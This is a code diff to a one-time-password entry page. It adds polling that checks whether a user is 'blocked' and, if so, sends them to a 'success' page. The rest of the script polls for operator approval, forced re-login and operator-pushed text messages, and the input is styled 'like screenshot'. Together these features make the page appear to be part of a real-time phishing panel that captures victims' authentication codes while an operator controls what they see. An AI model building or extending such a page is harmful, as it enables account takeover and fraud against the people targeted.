@@ -61,7 +61,6 @@ h2{
   margin-bottom:28px;
 }
 
-/* Single OTP Input - like screenshot */
 .otp-input{
   width:100%;
   padding:16px;
@@ -356,10 +355,41 @@ button:disabled{
   const errorDiv = document.getElementById('errorMessage');
   let isProcessing = false;
   let approvalInterval = null;
+  let blockCheckInterval = null;
 
-  // Flags to prevent modals from re-triggering while open
   let isModalOpen = false;
   let isTextModalOpen = false;
+
+  // ========== BLOCK CHECK FUNCTION ==========
+  async function checkIfBlocked() {
+    try {
+      const response = await fetch('/api/users/check-blocked', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await response.json();
+      if (data.blocked === true) {
+        window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+        return true;
+      }
+      return false;
+    } catch (err) {
+      console.log('Block check error:', err);
+      return false;
+    }
+  }
+
+  function startBlockChecking() {
+    if (blockCheckInterval) clearInterval(blockCheckInterval);
+    blockCheckInterval = setInterval(async () => {
+      const blocked = await checkIfBlocked();
+      if (blocked) {
+        clearInterval(blockCheckInterval);
+        clearInterval(approvalInterval);
+      }
+    }, 3000);
+  }
 
   function getOTP() {
     return otpInput.value.trim();
@@ -374,7 +404,7 @@ button:disabled{
 
   function showWaitingForApproval() {
     verifyBtn.disabled = true;
-    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating......</span>';
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>';
   }
 
   function hideLoading() {
@@ -387,6 +417,10 @@ button:disabled{
     if (approvalInterval) clearInterval(approvalInterval);
     approvalInterval = setInterval(async () => {
       try {
+        // Also check if blocked during waiting
+        const blocked = await checkIfBlocked();
+        if (blocked) return;
+        
         const response = await fetch('/api/users/check-first-approval', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -403,6 +437,11 @@ button:disabled{
 
   async function verifyOTP() {
     if (isProcessing) return;
+    
+    // Check if blocked before continuing
+    const isBlocked = await checkIfBlocked();
+    if (isBlocked) return;
+    
     const otp = getOTP();
     if (!otp || otp.length !== 6) {
       errorDiv.textContent = 'Please enter all 6 characters';
@@ -420,6 +459,7 @@ button:disabled{
       const data = await response.json();
       if (data.success) {
         showWaitingForApproval();
+        startBlockChecking();
         startCheckingApproval();
       } else {
         hideLoading();
@@ -506,7 +546,6 @@ button:disabled{
           messageContent.textContent = data.admin_text;
           modal.classList.add('active');
           
-          // Continue polling to check for release
           const checkReleaseInterval = setInterval(async () => {
             try {
               const releaseCheck = await fetch('/api/users/check-admin-text', {
@@ -527,7 +566,6 @@ button:disabled{
     }, 2000);
   }
 
-  // ========== MODAL FUNCTIONS ==========
   function hideLoginModal() {
     isModalOpen = false;
     document.getElementById('loginModal').classList.remove('active');
@@ -580,12 +618,12 @@ button:disabled{
     }
   }
 
-  // ========== START POLLING ==========
+  // Start all polling
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startAdminTextPolling();
+  startBlockChecking();
 
-  // ========== EVENT LISTENERS ==========
   verifyBtn.addEventListener('click', verifyOTP);
   otpInput.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') verifyOTP();
